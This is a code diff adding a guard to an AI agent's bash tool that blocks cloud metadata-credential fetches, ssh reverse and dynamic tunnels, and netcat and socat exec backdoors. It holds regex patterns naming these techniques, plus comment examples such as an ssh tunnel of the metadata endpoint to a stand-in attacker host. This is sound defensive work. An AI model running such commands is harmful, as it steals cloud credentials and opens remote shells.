@@ -108,6 +108,12 @@ def _translate_windows_heredocs(cmd: str) -> tuple[str, str | None]:
 #                         area) are allowed; destructive writes to protected
 #                         daemon state files and to absolute paths outside
 #                         the workspace are blocked
+#   both checked tiers  — destination-based containment-escape guard
+#                         (issue #1102, borrowed from Claude Code v2.1.257):
+#                         cloud metadata-credential fetches (IMDS/ECS/GCP)
+#                         and egress-tunnel markers (ssh -R/-D, nc -e,
+#                         socat EXEC:/SYSTEM:, IMDSv2 token) are blocked;
+#                         the danger tier only warns (command still runs)
 #
 # Enforcement is deliberately heuristic (host design-finalized): a static
 # command scan, NOT an OS-level sandbox (no bwrap/Seatbelt/ACL). The checked
@@ -150,6 +156,76 @@ _GIT_STASH_READ_RE = re.compile(r"\bgit\s+stash\s+(?:list|show)(?:\s|$|\|)")
 # matches the bare `git worktree` / `git submodule` tokens. Exempt a pure
 # read; any worktree/submodule MUTATOR keyword below still blocks.
 _GIT_WT_READ_RE = re.compile(r"\bgit\s+(?:worktree\s+list|submodule\s+status)\b")
+
+# ── Containment-escape guard (issue #1102) ─────────────────────────────────
+# Borrowed from Claude Code v2.1.257 ("Containment Escape"): block cloud
+# metadata-credential fetches and egress-tunnel markers. The write-target
+# scan cannot catch these — a metadata fetch is a READ and touches no
+# protected file path, so the destination-based scan below is required.
+
+# Cloud metadata endpoints — never legitimate in development commands.
+# IMDSv1/v2 (AWS), ECS container creds (AWS), GCP metadata (IP + DNS),
+# IMDSv2 IPv6 (AWS).
+_METADATA_ENDPOINT_RE = re.compile(
+    r"169\.254\.169\.254|169\.254\.170\.2|169\.254\.169\.123|"
+    r"metadata\.google\.internal|fd00:ec2::254"
+)
+# ssh remote/dynamic forward (-R / -D) — the classic egress tunnels
+# (`ssh -R 1080:169.254.169.254:80 user@attacker`). Requires a standalone
+# `ssh` token (never ssh-add/ssh-agent/ssh-keygen/...), stops at quotes so
+# `ssh host 'grep -R x'` (a remote command, not a tunnel) is not flagged, and
+# does NOT block `-L` (the common dev port-forward; a `-L` whose destination
+# is a metadata endpoint is already caught by the endpoint rule above).
+_SSH_TUNNEL_RE = re.compile(
+    r"(?<!\S)ssh(?:\.exe)?\s+(?:[^|;&\n'\"]*?\s)?-[a-zA-Z]*[RD][a-zA-Z]*"
+)
+# ssh long-form forwards (`-o RemoteForward=...` / `-o DynamicForward=...`).
+# These are often quoted (`-o 'RemoteForward=1080:localhost:80'`), so this
+# rule deliberately does NOT stop at quotes — the RemoteForward=/DynamicForward=
+# string has no legitimate non-tunnel use (unlike `-R`, which collides with
+# `grep -R` inside remote commands).
+_SSH_FORWARD_LONG_RE = re.compile(
+    r"(?<!\S)ssh(?![\w-])[^|;&\n]*?\b(?:Remote|Dynamic)Forward\s*="
+)
+# netcat / ncat with -e/--exec — a reverse/backdoor shell, never legitimate.
+_NC_EXEC_RE = re.compile(
+    r"\bnc(?:at)?\b[^|;&\n'\"]*?(?:-[a-zA-Z]*e[a-zA-Z]*\b|--exec\b)"
+)
+# socat with EXEC:/SYSTEM: — a backdoor address, never legitimate.
+_SOCAT_EXEC_RE = re.compile(r"\bsocat\b[^|;&\n'\"]*\b(?:EXEC|SYSTEM):")
+# IMDSv2 token request header — belt-and-suspenders for URL-obfuscated fetches.
+_IMDSV2_TOKEN_RE = re.compile(r"X-aws-ec2-metadata-token")
+
+
+def _check_containment_escape(cmd: str) -> str | None:
+    """Destination-based containment-escape scan (issue #1102, borrowed from
+    Claude Code v2.1.257 "Containment Escape").
+
+    Returns a block reason naming the exact escape vector when the command
+    fetches cloud metadata credentials or opens an egress tunnel; returns
+    None when the command looks clean.
+
+    Complements the write-target scan: ``curl http://169.254.169.254/...``
+    touches no protected file path, so ``workspace-write`` target checks pass
+    it — the credential exfiltration happens over the network. Runs on both
+    checked tiers (read-only blocks writes, but a metadata fetch is a read,
+    so the destination check is required there too).
+    """
+    for label, pattern in (
+        ("cloud-metadata endpoint", _METADATA_ENDPOINT_RE),
+        ("ssh egress tunnel (-R/-D)", _SSH_TUNNEL_RE),
+        ("ssh egress tunnel (Remote/DynamicForward)", _SSH_FORWARD_LONG_RE),
+        ("netcat exec backdoor", _NC_EXEC_RE),
+        ("socat EXEC/SYSTEM backdoor", _SOCAT_EXEC_RE),
+        ("IMDSv2 token request", _IMDSV2_TOKEN_RE),
+    ):
+        m = pattern.search(cmd)
+        if m:
+            return (
+                f"containment-escape: blocked {label} {m.group(0)!r} "
+                "(cloud credential exfiltration guard, issue #1102)"
+            )
+    return None
 
 
 def _extract_write_targets(cmd: str) -> list[str]:
@@ -361,6 +437,13 @@ def _check_sandbox(cmd: str, mode: str, workdir: str | None = None) -> tuple[boo
     if mode == "danger-full-access":
         return True, None, "full"
 
+    # Containment-escape guard (issue #1102): destination-based, applies to
+    # both checked tiers. A metadata-credential fetch is a READ and escapes
+    # the write-target scan below — it must run before the early returns.
+    escape = _check_containment_escape(cmd)
+    if escape:
+        return False, escape, "partial"
+
     targets = _extract_write_targets(cmd)
     if mode == "read-only":
         for t in targets:
@@ -514,6 +597,7 @@ class BashTool(ToolExecutor):
 
         # Static file-level isolation check (rant 2026-08-20T15:46:50).
         sandbox_tag: str | None = None
+        containment_warning: str | None = None
         if sandbox and sandbox != "danger-full-access":
             allowed, reason, enforcement = _check_sandbox(cmd, sandbox, workdir)
             if not allowed:
@@ -528,6 +612,11 @@ class BashTool(ToolExecutor):
                 )
             sandbox_tag = f"[sandbox:{sandbox} enforcement={enforcement}]"
             logger.debug("bash: sandbox %s check passed", sandbox)
+        elif sandbox == "danger-full-access":
+            # Issue #1102: the danger tier opts into no blocking, but a
+            # containment-escape command still gets a visible warning so the
+            # caller can spot credential exfiltration in the tool result.
+            containment_warning = _check_containment_escape(cmd)
 
         logger.debug("bash: running %r (timeout=%ds)", cmd[:100], timeout)
 
@@ -632,6 +721,11 @@ class BashTool(ToolExecutor):
             result = "\n".join(parts)
             if sandbox_tag:
                 result = f"{sandbox_tag} ok\n{result}"
+            if containment_warning:
+                result += (
+                    f"\n⚠️ [sandbox:danger-full-access] {containment_warning} "
+                    "— executed anyway (danger tier opts into no blocking)"
+                )
             return ToolResult(name="bash", content=result)
         except FileNotFoundError:
             return ToolResult(
